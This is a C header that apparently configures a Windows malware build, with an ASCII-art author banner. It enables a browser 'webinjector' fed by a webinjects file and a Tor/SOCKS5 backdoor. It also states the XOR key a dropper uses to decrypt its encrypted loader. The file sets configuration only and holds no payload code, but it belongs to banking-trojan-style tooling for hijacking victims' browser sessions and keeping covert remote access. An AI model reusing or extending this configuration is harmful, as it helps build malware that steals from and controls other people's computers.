// Primary API config
#pragma once

#include <Windows.h>

#ifdef CONFIG_OK
#error ">>>>>>>>>>>CONFIG_COMPILE64 ALREADY SET"
#endif
#define CONFIG_OK

#ifdef CONFIG_COMPILE64
#error ">>>>>>>>>>>CONFIG_COMPILE64 ALREADY SET"
#endif

// Use standard types (types.h)
#define UTILIZE_API_OBJECTS

// 64-bit compilation
//#define CONFIG_COMPILE64 // 32-bit API if not defined.
#ifdef CONFIG_COMPILE64
#ifndef _WIN64
#error "API: Architecture mismatch. CONFIG_COMPILE64 defined while _WIN64 not defined."
#endif
#else
// 32-bit mode
#ifdef _WIN64
#error "API: Architecture mismatch. _WIN64 defined while CONFIG_COMPLE64 not defined."
#endif
#endif

// Path configs
#define ROOT_PATH				"J:/_api/"
#define CONFIG_PATH				"J:/_api/config.h"

#define API_PATH				"api.h"	
#define API_API					
#define API_REG					

#define COMMON_PATH				"common/"
#define COMMON_CRYPT			"common/crypt.h"
#define COMMON_FS				"common/fs.h"
#define COMMON_ID				"common/id.h"
#define COMMON_INLINE			"common/inline.h"
#define COMMON_INT				"common/int.h"
#define COMMON_MEM				"common/mem.h"
#define COMMON_STR				"common/str.h"
#define COMMON_OBJECTS			"common/types.h"
#ifdef UTILIZE_API_OBJECTS
#include COMMON_OBJECTS
#endif

#define CORE_PATH	

#define DEBUG_PATH				"debug/"
#define DEBUG_MAIN				"debug/debug.h"
#define DEBUG_ASSERT			"debug/assert.h"
#define DEBUG_ERROR				"debug/error.h"
#define DEBUG_STDIN				"debug/stdin.h"

#define EXTERNAL_PATH		
#define HTTP_PATH	
#define INJECT_PATH		
#define NET_PATH			

// Stylistic 
#define OUTPUT_PROMPT			"[#] "
#define OUTPUT_PRIMARY			OUTPUT_PROMPT
#define OUTPUT_SECONDARY		"    ->"

// Preprocessor output
#define DISABLE_CODERS_BULLSHIT			// Disables my leet m0s thing
#define DISABLE_LIBRARY_INFO			// Disables each library's preprocessor info
#define DISABLE_SECONDARY_OUTPUT		// Disables module config output

#ifndef DISABLE_LIBRARY_INFO
#pragma message (OUTPUT_PRIMARY			"API Version 1.0")
#ifdef CONFIG_COMPILE64
#pragma message (OUTPUT_PRIMARY			"64-bit Compilation.")
#else
#pragma message (OUTPUT_PRIMARY			"32-bit Compilation.")
#endif
#pragma message (OUTPUT_PRIMARY			"Config:")
#pragma message (OUTPUT_SECONDARY		"Root path: "			ROOT_PATH)
#pragma message (OUTPUT_SECONDARY		"config.h path: "		CONFIG_PATH)
#ifdef UTILIZE_API_OBJECTS
#pragma message (OUTPUT_SECONDARY		"Using common types")
#endif
#endif

#ifndef DISABLE_CODERS_BULLSHIT
#pragma message ("written by:             .oooo.           ")
#pragma message ("                       d8P'`Y8b           ")
#pragma message ("    ooo. .oo.  .oo.   888    888  .oooo.o ")
#pragma message ("     888   888   888  888    888 `\"Y88b.  ")
#pragma message ("     888   888   888  888    888 `\"Y88b.  ")
#pragma message (".o.  888   888   888  `88b  d88' o.  )88b ")
#pragma message ("Y8P o888o o888o o888o  `Y8bd8P'  8""888P' ")
#endif

// Webinjector related configs ////////////////////////////////////////////////
// Disable resolve of PR_OpenTCPSocket (obsolete)
#define DISABLE_PROPENTCPSOCKET

// Enables the tor backdoor/SOCKS5 
#define ENABLE_TOR_BACKDOOR

#define MODE_LOAD_CONFIG_FROM_DISK // Loads raw config from disk. Debugging only
#ifdef MODE_LOAD_CONFIG_FROM_DISK
#ifndef PROJECT_HTTP_MIRROR
#define RAW_DYNAMIC_CONFIG "J:/_build/webinjector/webinjector/webinjects.txt"
#else
#define RAW_DYNAMIC_CONFIG "J:/_build/httpmirror/httpmirror/httpmirror.txt"
#endif

#ifndef DISABLE_SECONDARY_OUTPUT
#pragma message (OUTPUT_PRIMARY "WARNING: Reading injector config from disk. Debug only!")
#endif

#endif

// Disables tracking IDs (does not build vector array with all IDs)
#undef DISABLE_ID_TRACKING
#define DISABLE_ID_TRACKING

// Config for crypt library timings
#define CONFIG_CRYPT_TIMEOUT			60

// Config for XTP timeouts
#define CONFIG_XTP_TIMEOUT				60

// Use custom allocator in all instances of `new`?
//#define CONFIG_USE_CUSTOM_NEW	

// Dropper encrypts loader as last segment. This is the DWORD xor key used to decrypt
#define USE_LAST_XOR					0xf1af553d

// Does the program exit on EXIT(0) or sleep forever after giving the error message
#define DO_NOT_EXIT_AFTER_FAILURE